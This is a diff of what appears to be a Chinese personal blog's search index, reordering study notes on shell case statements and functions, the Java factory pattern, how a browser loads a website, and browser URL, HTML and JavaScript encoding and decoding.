+<h2 id="case-…-esac"><a href="#case-…-esac" class="headerlink" title="case … esac"></a>case … esac</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">read</span> num</span><br><span class="line"><span class="keyword">case</span> <span class="variable">$num</span> <span class="keyword">in</span></span><br><span class="line">	1) <span class="built_in">echo</span> <span class="string">&#x27;你选择了1&#x27;</span></span><br><span class="line">	;;</span><br><span class="line">	2) <span class="built_in">echo</span> <span class="string">&#x27;你选择了2&#x27;</span></span><br><span class="line">	;;</span><br><span class="line">	*) <span class="built_in">echo</span> <span class="string">&#x27;请正常输入&#x27;</span></span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">test</span></span>()&#123;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&#x27;这是一个函数&#x27;</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$1</span> <span class="variable">$2</span></span><br><span class="line">	<span class="built_in">return</span> <span class="variable">$1</span> <span class="variable">$2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">test</span> 1 2</span><br><span class="line">func=<span class="keyword">function</span>&#123;</span><br><span class="line">	<span class="comment">#body</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="输入输出重定向"><a href="#输入输出重定向" class="headerlink" title="输入输出重定向"></a>输入输出重定向</h1><p><a href="Untitled%20569327758ca8421ebe2a12f906547f30.csv">Untitled</a></p>
+<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>. filename</p>
+<p>source filename</p>
+]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>编程语言</category>
+      </categories>
+      <tags>
+        <tag>Shell编程</tag>
+        <tag>Shell</tag>
       </tags>
   </entry>
   <entry>
@@ -4883,6 +4883,40 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       </tags>
   </entry>
   <entry>
+    <title>工厂模式</title>
+    <url>/archives/54788f73.html</url>
+    <content><![CDATA[<h1 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h1><p>工厂模式是Java中最常用的设计模式之一，这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。在工厂模式中，我们在创建对象时不会对客户端暴露创建逻辑，并且是通过使用一个共同的接口来指向新创建的对象。</p>
+<p>个人认为工厂模式就是为了隐藏对象的具体实现，提供一个接口给用户使用，这个接口就是工厂，就想我们买一件产品，我们可以直接向工厂批发，我们只需要提供给厂家产品的名字，厂家就提供给我们可以完成我们需求的对应的产品。这就是工厂模式，我们并不需要知道这个产品的原材料是什么、是怎么做出来的。</p>
+<p>下面的图诠释了工厂模式的工作流程</p>
+<p><img src="/archives/54788f73/Untitled.png" alt="Untitled"></p>
+<h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤 1"></a><strong>步骤 1</strong></h3><p>创建一个接口:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Shape.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤 2"></a><strong>步骤 2</strong></h3><p>创建实现接口的实体类。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Rectangle.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rectangle</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line"> </span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Inside Rectangle::draw() method.&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Square.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Square</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line"> </span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Inside Square::draw() method.&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Circle.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Circle</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line"> </span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Inside Circle::draw() method.&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤 3"></a><strong>步骤 3</strong></h3><p>创建一个工厂，生成基于给定信息的实体类的对象。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ShapeFactory.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShapeFactory</span> &#123;</span><br><span class="line">    </span><br><span class="line">   <span class="comment">//使用 getShape 方法获取形状类型的对象</span></span><br><span class="line">   <span class="keyword">public</span> Shape <span class="title function_">getShape</span><span class="params">(String shapeType)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(shapeType == <span class="literal">null</span>)&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">      &#125;        </span><br><span class="line">      <span class="keyword">if</span>(shapeType.equalsIgnoreCase(<span class="string">&quot;CIRCLE&quot;</span>))&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Circle</span>();</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(shapeType.equalsIgnoreCase(<span class="string">&quot;RECTANGLE&quot;</span>))&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Rectangle</span>();</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(shapeType.equalsIgnoreCase(<span class="string">&quot;SQUARE&quot;</span>))&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Square</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤 4"></a><strong>步骤 4</strong></h3><p>使用该工厂，通过传递类型信息来获取实体类的对象。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">FactoryPatternDemo.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FactoryPatternDemo</span> &#123;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">ShapeFactory</span> <span class="variable">shapeFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShapeFactory</span>();</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//获取 Circle 的对象，并调用它的 draw 方法</span></span><br><span class="line">      <span class="type">Shape</span> <span class="variable">shape1</span> <span class="operator">=</span> shapeFactory.getShape(<span class="string">&quot;CIRCLE&quot;</span>);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//调用 Circle 的 draw 方法</span></span><br><span class="line">      shape1.draw();</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//获取 Rectangle 的对象，并调用它的 draw 方法</span></span><br><span class="line">      <span class="type">Shape</span> <span class="variable">shape2</span> <span class="operator">=</span> shapeFactory.getShape(<span class="string">&quot;RECTANGLE&quot;</span>);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//调用 Rectangle 的 draw 方法</span></span><br><span class="line">      shape2.draw();</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//获取 Square 的对象，并调用它的 draw 方法</span></span><br><span class="line">      <span class="type">Shape</span> <span class="variable">shape3</span> <span class="operator">=</span> shapeFactory.getShape(<span class="string">&quot;SQUARE&quot;</span>);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//调用 Square 的 draw 方法</span></span><br><span class="line">      shape3.draw();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="步骤-5"><a href="#步骤-5" class="headerlink" title="步骤 5"></a><strong>步骤 5</strong></h3><p>执行程序，输出结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Inside Circle::draw() method.</span><br><span class="line">Inside Rectangle::draw() method.</span><br><span class="line">Inside Square::draw() method.</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>设计模式</category>
+      </categories>
+      <tags>
+        <tag>工厂模式</tag>
+        <tag>设计模式</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>应急响应</title>
     <url>/archives/587e8742.html</url>
     <content><![CDATA[<h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="入侵检测"><a href="#入侵检测" class="headerlink" title="入侵检测"></a>入侵检测</h2><h3 id="系统账户相关"><a href="#系统账户相关" class="headerlink" title="系统账户相关"></a>系统账户相关</h3><ul>
@@ -4938,40 +4972,6 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       </categories>
       <tags>
         <tag>应急响应</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>工厂模式</title>
-    <url>/archives/54788f73.html</url>
-    <content><![CDATA[<h1 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h1><p>工厂模式是Java中最常用的设计模式之一，这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。在工厂模式中，我们在创建对象时不会对客户端暴露创建逻辑，并且是通过使用一个共同的接口来指向新创建的对象。</p>
-<p>个人认为工厂模式就是为了隐藏对象的具体实现，提供一个接口给用户使用，这个接口就是工厂，就想我们买一件产品，我们可以直接向工厂批发，我们只需要提供给厂家产品的名字，厂家就提供给我们可以完成我们需求的对应的产品。这就是工厂模式，我们并不需要知道这个产品的原材料是什么、是怎么做出来的。</p>
-<p>下面的图诠释了工厂模式的工作流程</p>
-<p><img src="/archives/54788f73/Untitled.png" alt="Untitled"></p>
-<h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤 1"></a><strong>步骤 1</strong></h3><p>创建一个接口:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Shape.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤 2"></a><strong>步骤 2</strong></h3><p>创建实现接口的实体类。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Rectangle.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rectangle</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line"> </span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Inside Rectangle::draw() method.&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Square.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Square</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line"> </span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Inside Square::draw() method.&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Circle.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Circle</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line"> </span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Inside Circle::draw() method.&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤 3"></a><strong>步骤 3</strong></h3><p>创建一个工厂，生成基于给定信息的实体类的对象。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ShapeFactory.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShapeFactory</span> &#123;</span><br><span class="line">    </span><br><span class="line">   <span class="comment">//使用 getShape 方法获取形状类型的对象</span></span><br><span class="line">   <span class="keyword">public</span> Shape <span class="title function_">getShape</span><span class="params">(String shapeType)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(shapeType == <span class="literal">null</span>)&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">      &#125;        </span><br><span class="line">      <span class="keyword">if</span>(shapeType.equalsIgnoreCase(<span class="string">&quot;CIRCLE&quot;</span>))&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Circle</span>();</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(shapeType.equalsIgnoreCase(<span class="string">&quot;RECTANGLE&quot;</span>))&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Rectangle</span>();</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(shapeType.equalsIgnoreCase(<span class="string">&quot;SQUARE&quot;</span>))&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Square</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤 4"></a><strong>步骤 4</strong></h3><p>使用该工厂，通过传递类型信息来获取实体类的对象。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">FactoryPatternDemo.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FactoryPatternDemo</span> &#123;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">ShapeFactory</span> <span class="variable">shapeFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShapeFactory</span>();</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//获取 Circle 的对象，并调用它的 draw 方法</span></span><br><span class="line">      <span class="type">Shape</span> <span class="variable">shape1</span> <span class="operator">=</span> shapeFactory.getShape(<span class="string">&quot;CIRCLE&quot;</span>);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//调用 Circle 的 draw 方法</span></span><br><span class="line">      shape1.draw();</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//获取 Rectangle 的对象，并调用它的 draw 方法</span></span><br><span class="line">      <span class="type">Shape</span> <span class="variable">shape2</span> <span class="operator">=</span> shapeFactory.getShape(<span class="string">&quot;RECTANGLE&quot;</span>);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//调用 Rectangle 的 draw 方法</span></span><br><span class="line">      shape2.draw();</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//获取 Square 的对象，并调用它的 draw 方法</span></span><br><span class="line">      <span class="type">Shape</span> <span class="variable">shape3</span> <span class="operator">=</span> shapeFactory.getShape(<span class="string">&quot;SQUARE&quot;</span>);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//调用 Square 的 draw 方法</span></span><br><span class="line">      shape3.draw();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="步骤-5"><a href="#步骤-5" class="headerlink" title="步骤 5"></a><strong>步骤 5</strong></h3><p>执行程序，输出结果：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Inside Circle::draw() method.</span><br><span class="line">Inside Rectangle::draw() method.</span><br><span class="line">Inside Square::draw() method.</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>安全技术</category>
-        <category>设计模式</category>
-      </categories>
-      <tags>
-        <tag>工厂模式</tag>
-        <tag>设计模式</tag>
       </tags>
   </entry>
   <entry>
@@ -5281,74 +5281,6 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       </tags>
   </entry>
   <entry>
-    <title>浏览器访问网站过程</title>
-    <url>/archives/41b7ef22.html</url>
-    <content><![CDATA[<h1 id="浏览器访问网站过程"><a href="#浏览器访问网站过程" class="headerlink" title="浏览器访问网站过程"></a>浏览器访问网站过程</h1><h1 id="QUESTION1：浏览器访问网站的过程"><a href="#QUESTION1：浏览器访问网站的过程" class="headerlink" title="QUESTION1：浏览器访问网站的过程"></a>QUESTION1：浏览器访问网站的过程</h1><h2 id="step1：缓存查找"><a href="#step1：缓存查找" class="headerlink" title="step1：缓存查找"></a>step1：缓存查找</h2><p>如果改页面在短时间内被访问过，则会经过缓存茶盏来判断是否需要请求新的资源，根据max-age、expires、cache-control、if-none-match、last-modifiled、etoken等来判断是走浏览器缓存还是向服务器请求数据，走浏览器缓存则直接返回数据，响应状态设置为灰色的200。</p>
-<h2 id="step1：域名解析"><a href="#step1：域名解析" class="headerlink" title="step1：域名解析"></a>step1：域名解析</h2><hr>
-<p>首先浏览器需要做域名解析，在浏览器本地的缓存中寻找是否又该域名的解析，如果没有，则到主机的缓存中去寻找，如果也没有，就到主机的hosts文件中去寻找，如果仍然没有则到路由器中找，如果还没有则根据指定的本地dns地址到指定的本地域名服务器上去寻找，如果没有寻找到，则到缓存中去找，如果也没有且如果配置了转发的话，则会把这个请求转发到该域名服务器的上一级域名服务器解析，上一级域名服务器如果也没有寻找到要么再到上一级或者到根服务器去寻找，这个过程叫做<code>递归查询</code>。根服务器告知主机负责解析顶级域名的服务器的地址，顶级域名服务器告知负责二级域名解析的服务器的地址，二级域名解析服务器告知三级域名解析的服务器的地址，依次迭代，直到找到该域名的解析为止，这个过程叫做<code>迭代查询</code>。</p>
-<h2 id="step2：建立tcp连接"><a href="#step2：建立tcp连接" class="headerlink" title="step2：建立tcp连接"></a>step2：建立tcp连接</h2><hr>
-<p>域名解析完成后，开始建立tcp连接，连接时进行三次握手，首先客户端发送syn报文，将标志位syn设为1，同步序列号设为x,进入syn_send状态，服务器收到请求后回一个ack报文，其中标志位syn设为1，ack标志位设为1，同步序列号设为y,确认号设为x+1，进入syn_recieve状态，客户端收到确认报文之后，发送确认报文到服务器，ack标志位设为1，确认号设为y+1,进入established状态，此时tcp连接建立完毕。</p>
-<h2 id="step3：发送请求"><a href="#step3：发送请求" class="headerlink" title="step3：发送请求"></a>step3：发送请求</h2><hr>
-<p>tcp连接建立后开始开始传送http协议数据内容，经过tcp&#x2F;ip协议五层层层封装，数据首先在五层编码成二进制，再到4层经过tcp层加上5层协议的端口号，根据数据链路层MTU对数据进行分段，然后到3层加上ip地址与4层协议号，然后数据到了三层后，首先判断目标ip地址是不是与本机处在同一网段，如果是在同一网段，则查询arp缓存表，或者进行arp广播，如果没有在同一网段则根据本机配置的网关地址，查询arp缓存表或者广播查询网关的mac地址，完成后封装帧头帧尾，然后数据被发送网关，由网关进行地址转换，然后层层路由到服务器端。</p>
-<h2 id="step4：服务器解析请求，发送数据"><a href="#step4：服务器解析请求，发送数据" class="headerlink" title="step4：服务器解析请求，发送数据"></a>step4：服务器解析请求，发送数据</h2><hr>
-<p>服务器根据请求内容返回相应内容，如果请求的是静态网页，将直接由web中间件根据url中请求的内容返回对应的数据，如果请求的是动态的页面，则web中间件将请求通过socket发送到动态脚本解析器解析执行，解析器若发现需要查询数据库，则会连接数据库进行查询并将数据添加到结果中，脚本解析器解析完后，将数据发回给web中间件，web中间件再发回给浏览器。</p>
-<h2 id="step5：断开连接"><a href="#step5：断开连接" class="headerlink" title="step5：断开连接"></a>step5：断开连接</h2><hr>
-<p>当浏览器没有要发送的数据时，服务器首先发送一个结束报文，我们称其为执行主动关闭，该报文中fin标志位设置为1，ack标志位设置位1，syn标志位设置位0，同步序列号为x,确认号设置为z,此时服务器关闭其发送数据服务，但仍然可以接受来自浏览器的数据，浏览器接收到后回复服务器一个ack报文，表示已经接收到了服务器的结束连接请求，设置ack标志位为1，syn标志位位0，fin标志位为0，同步序列号为z,此时如果浏览器仍然有请求，仍然可以发送给服务器，等到浏览器没有请求发送后，其会发送一个带有fin+ack标志位的包给服务器，并设置确认号位X，同步序列号位Y表示没有数据再发送给服务器了，进入lask_ack状态，当服务器收到该报文后，发送一个带有ack标记的包给浏览器，同步序列号设置为X，此时服务其进入最终确认状态fn_ack ,待等待了2msl(2倍报文最大生存时间)后，服务器释放连接。</p>
-<h2 id="step6：浏览器解析、渲染数据"><a href="#step6：浏览器解析、渲染数据" class="headerlink" title="step6：浏览器解析、渲染数据"></a>step6：浏览器解析、渲染数据</h2><hr>
-<p>客户端收到数据后，经过层层的解封装、重组等操作最终将数据发送到浏览器。浏览器接受到数据后首先将html代码构造成DOM树，css文件构造成CSSOM,这两个过程是同步进行，然后浏览器合并这两棵树，生成渲染树，最后进行重构，渲染等操作得到我们看到的网页</p>
-<h1 id="QUESTION2：一台计算机最多可以有多少个网络端口（逻辑）？"><a href="#QUESTION2：一台计算机最多可以有多少个网络端口（逻辑）？" class="headerlink" title="QUESTION2：一台计算机最多可以有多少个网络端口（逻辑）？"></a>QUESTION2：一台计算机最多可以有多少个网络端口（逻辑）？</h1><p><strong>共有655356个端口</strong></p>
-<ol>
-<li>0-1023 公认端口，一般都有特殊的含义，个人在分配端口的时候一般不使用这些端口</li>
-<li>1024-49151 注册端口：这些端口可以用于绑定一些服务</li>
-<li>49152-65535 私有端口：这些端口我们在测试的过程中可以使用</li>
-</ol>
-<h1 id="QUESTION3：127-0-0-1在网络安全和测试中的现实意义有哪些？"><a href="#QUESTION3：127-0-0-1在网络安全和测试中的现实意义有哪些？" class="headerlink" title="QUESTION3：127.0.0.1在网络安全和测试中的现实意义有哪些？"></a>QUESTION3：127.0.0.1在网络安全和测试中的现实意义有哪些？</h1><p>一般用作测试用，可以用于测试本机的网络配置是否成功，可以用于本机应用间的通信</p>
-<h1 id="QUESTION3：部署网站的体会"><a href="#QUESTION3：部署网站的体会" class="headerlink" title="QUESTION3：部署网站的体会"></a>QUESTION3：部署网站的体会</h1><p>我在部署过程中遇到的一个问题就是PHP版本不匹配的问题，我使用的PHP版本时7.3，这个版本的PHP与老的版本的PHP有较大的差别，就我所知道的，7.3版本里面单条mysql单条查询语句的执行函数时mysqli_query(),而老版本的PHP中确是mysql_qurey，所以我在发布网站之后，访问页面是一片空白。这个问题我在部署sqli_labs的时候也遇到过，不过当时有报错信息，所以我很快就找到了问题的根源，但这次却没有报错信息，所以浪费了很多的时间，还向刘俊岑请教了一下，我方才大彻大悟，可能是PHP版本不兼容导致的， 在我使用了低版本的PHP后，这个问题果然被解决了。</p>
-]]></content>
-      <categories>
-        <category>安全技术</category>
-        <category>浏览器</category>
-      </categories>
-      <tags>
-        <tag>浏览器</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>浏览器编码与解码</title>
-    <url>/archives/8891b17.html</url>
-    <content><![CDATA[<h1 id="浏览器编码与解码"><a href="#浏览器编码与解码" class="headerlink" title="浏览器编码与解码"></a>浏览器编码与解码</h1><h1 id="访问网站过程中涉及的编解码"><a href="#访问网站过程中涉及的编解码" class="headerlink" title="访问网站过程中涉及的编解码"></a>访问网站过程中涉及的编解码</h1><h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h2><p>在url中如果在参数部分出现&#x2F;等特殊字符，会导致浏览器对资源路径的错误判断，为了解决这个问题，引入了url编码这一概念，它是以%加字符的ascii码对应的二位十六进制数如 ‘&#x3D;%23 space&#x3D;%20 </p>
-<h2 id="HTML编码"><a href="#HTML编码" class="headerlink" title="HTML编码"></a>HTML编码</h2><p>在html中有一些字符是需要预留的，如&lt; &amp; 等，如果用户输入这些字符后被直接输出到html中，则可能导致浏览器在创建dom树的时候错误的识别标签的开始，从而导致错误。于是引入了html编码，有两种类型，被称为HTML编码与HTML编号。如&lt;可以被表示为：&lt;,&#60;,&#x3c;</p>
-<p><code>注意：</code>&amp;开头 ;结尾</p>
-<p>JS编码</p>
-<p>js编码采用unicode字符集，四个字节表示一个字符</p>
-<p>js常见的反斜杠方式编码处理</p>
-<ul>
-<li>\b退格符，\t制表符，\v垂直制表符等；</li>
-<li>三位数字，不足位数用0补充，按8位原字符八进制字符编码；</li>
-<li>两位数字，不足位数用0补充，按8位原字符16进制字符编码，前缀 x</li>
-<li>四位数字，不足为数用0补充，按16位原字符16进制Unicode数值编码，前缀 u 。</li>
-</ul>
-<p>如\145、\x65和\u0065都代表字符e。</p>
-<h1 id="浏览器解码顺序"><a href="#浏览器解码顺序" class="headerlink" title="浏览器解码顺序"></a>浏览器解码顺序</h1><h2 id="URL解码"><a href="#URL解码" class="headerlink" title="URL解码"></a>URL解码</h2><p>url解码过程较为简单，服务器对接收到用户传输过来的URL进行解析，遇到%便自动进行解码。</p>
-<h2 id="HTML解码"><a href="#HTML解码" class="headerlink" title="HTML解码"></a>HTML解码</h2><p>HTML解析器其实是一个状态机，在对HTML资源从上而下进行解析时遇到一个‘&lt;‘符号就会进入标签开始状态（Tag Open State），然后搜寻标签，img可以被识别为正确的标签，img1则不会识别，最后在读到最近的一个‘&gt;’时，结束标签状态进入数据状态（Data State）。</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;<span class="symbol">&amp;#104;</span>1&gt;Main Title<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> //无效代码</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>M<span class="symbol">&amp;#97;</span>inT<span class="symbol">&amp;#105;</span>tle<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> //有效代码</span><br></pre></td></tr></table></figure>
-
-<p>上例中，第一条不会被正常解析，第二条会被正常解析，由此可将<code>html实体编码的解码是发生在DOM树构建完成后才进行的</code>，<code>故html实体编码只能出现在数据区域，不能出现在标签开始状态与结束状态，这两种状态都不会被成功解码</code>。这很重要</p>
-<h2 id="JS解码"><a href="#JS解码" class="headerlink" title="JS解码"></a>JS解码</h2><p>得到一个html文档后，浏览器顺序构造dom树与cssom树，当遇到一个<script>标签后，dom构建被阻塞，等待js文件被加载完毕，执行完毕，之后继续构建dom树</p>
-<p><strong>为什么现在的js代码被放在最后面？</strong></p>
-<p>因为js代码会修改并阻塞dom的渲染，若js代码放在header中则在js执行完毕之前 ，浏览器窗口会显示一片空白，用户体验差，将js代码放在最后，能提供更好的用户体验</p>
-<p>js的脚本处理模型是按照源码处理-函数解析-代码执行这个执行流来的，重点是，先解码再执行，故可对js代码中的任意内容进行编码，js都能被成功执行。</p>
-]]></content>
-      <categories>
-        <category>安全技术</category>
-        <category>浏览器</category>
-      </categories>
-      <tags>
-        <tag>浏览器</tag>
-        <tag>编解码</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>浏览器缓存机制</title>
     <url>/archives/7beb4c43.html</url>
     <content><![CDATA[<h1 id="浏览器缓存机制"><a href="#浏览器缓存机制" class="headerlink" title="浏览器缓存机制"></a>浏览器缓存机制</h1><p>本笔记参考</p>
@@ -5410,6 +5342,74 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       <tags>
         <tag>浏览器</tag>
         <tag>缓存</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>浏览器编码与解码</title>
+    <url>/archives/8891b17.html</url>
